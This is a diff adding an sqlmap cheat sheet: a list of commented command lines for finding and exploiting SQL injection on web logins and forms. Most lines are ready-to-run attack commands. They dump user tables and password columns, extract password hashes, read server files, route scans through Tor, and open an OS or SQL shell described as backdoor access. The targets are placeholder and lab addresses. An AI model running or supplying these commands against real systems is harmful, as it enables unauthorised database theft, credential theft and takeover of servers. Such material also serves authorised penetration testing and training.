@@ -1,0 +1,111 @@
+# General parameters
+# --batch (avoids asking user questions, by replying automatically with defaults)
+# --dbms (can be mysql or others if we already know the type of DB, this can
+#         increase chances to perform successful attacks)
+# Advices, to check for sqli vulns:
+# 1. when we got a 302 redirect to 'http://172.28.128.17:80/login_success.php?username=admin'. Do you want to follow? [Y/n]
+#    we may both want to try with Y and n, I sometimes found vulnerable targets when not following the 302 location
+# 2. use maximum "risk" and maximum "level" (in feb/2020 risk=3 and level=5)
+
+
+# Simple Scan
+sqlmap.py -u "http://testsite.com/login.php"
+
+# Simple Scan on a GET parameter
+sqlmap.py -u "http://testsite.com/login.php?param1=ciao&param2=it" -p param1
+
+# Simple Scan on a POST parameter
+sqlmap.py -u "http://testsite.com/login.php" --data="param1=ciao&param2=it" -p param1
+
+# Simple Scan  (--batch does not let user reply to questions)
+sqlmap.py -u "http://testsite.com/login.php" --batch
+
+# Automated scan for all forms of a website
+sqlmap.py -u "http://meh.com" --forms --batch --crawl=10 \
+--cookie="jsessionid=54321" --level=5 --risk=3
+
+# Scan for a specific POST parameter
+./sqlmap.py -u http://172.28.128.17/checklogin.php --data="myusername=admin&mypassword=pass&Submit=Login" -p mypassword --risk 3 --level 5
+
+# Targeted Scan
+sqlmap.py -u "$TARGET" -p "$PARAMTOTEST" --data="$POSTDATA" --cookie="$COOKIE"\
+--level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php" 
+
+# Check for SQLi inside a form at URL
+sqlmap.py -o -u "http://meh.com/form/" --forms
+
+# Scanning by using tor
+sqlmap.py -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5
+
+# Scanning by manually setting the return time
+sqlmap.py -u "http://testsite.com/login.php" --time-sec 15
+
+# List all databases at the site
+sqlmap.py -u "http://testsite.com/login.php" --dbs
+
+# List all tables in a specific database
+sqlmap.py -u "http://testsite.com/login.php" -D site_db --tables
+
+# Dump the contents of a DB table
+sqlmap.py -u "http://testsite.com/login.php" -D site_db -T users --dump
+
+# List all columns in a table
+sqlmap.py -u "http://testsite.com/login.php" -D site_db -T users --columns
+
+# Dump only selected columns
+sqlmap.py -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump
+
+# Dump a table from a database when you have admin credentials
+sqlmap.py -u "http://testsite.com/login.php" --method "POST\
+--data "username=admin&password=admin&submit=Submit" \
+-D social_mccodes -T users --dump
+
+# Get OS Shell
+sqlmap.py --dbms=mysql -u "http://testsite.com/login.php" --os-shell
+
+# Get SQL Shell
+sqlmap.py --dbms=mysql -u "http://testsite.com/login.php" --sql-shell
+
+# Test URL and POST data and return database banner (if possible)
+./sqlmap.py --url="<url>" --data="<post-data>" --banner
+
+# Parse request data and test | request data can be obtained with zap or burp
+./sqlmap.py -r <request-file> <options>
+
+# Parse request data and test parameter for SQL Injection
+./sqlmap.py -r <request-file> -p <parameter_name_to_test> --batch
+
+# Fingerprint | much more information than banner
+./sqlmap.py -r <request-file> --fingerprint
+
+# Get database username, name, and hostname
+./sqlmap.py -r <request-file> --current-user --current-db --hostname
+
+# Check if user is a database admin
+./sqlmap.py -r <request-file> --is-dba
+
+# Get database users and password hashes
+./sqlmap.py -r <request-file> --users --passwords
+
+# Enumerate databases
+./sqlmap.py -r <request-file> --dbs
+
+# List tables for one database
+./sqlmap.py -r <request-file> -D <db-name> --tables
+
+# Enumeration flags
+./sqlmap.py -r <request-file> -D <db-name> --columns --schema --count
+./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> -U <user-name>
+
+# Extract data
+./sqlmap.py -r <request-file> -D <db-name> -T <tbl-name> -C <col-name> --dump
+
+# Execute SQL Query
+./sqlmap.py -r <request-file> --sql-query="<sql-query>"
+./sqlmap.py --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"
+
+# Append/Prepend SQL Queries
+./sqlmap.py -r <request-file> --prefix="<sql-query>" --suffix="<sql-query>"
+
+# Get backdoor access to sql server | can give shell access
+./sqlmap.py -r <request-file> --os-shell
